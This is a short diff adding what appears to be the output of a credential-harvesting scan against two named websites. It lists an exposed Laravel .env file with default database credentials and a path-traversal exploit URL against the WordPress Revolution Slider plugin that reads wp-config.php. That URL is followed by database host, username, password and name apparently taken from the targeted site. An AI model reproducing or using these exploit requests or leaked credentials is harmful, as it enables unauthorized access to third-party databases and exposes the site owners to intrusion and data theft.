@@ -1,0 +1,12 @@
+http://watpho.com/.env
+ Host:  127.0.0.1
+ user:  homestead
+ pass:  secret
+ DB:    homestead
+---------------------
+Full Config Path  : http://ctgroup.ro/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
+ Host:  localhost
+ user:  ctgrou16_wp
+ pass:  ct_12354
+ DB:    ctgrou16_wp
+---------------------
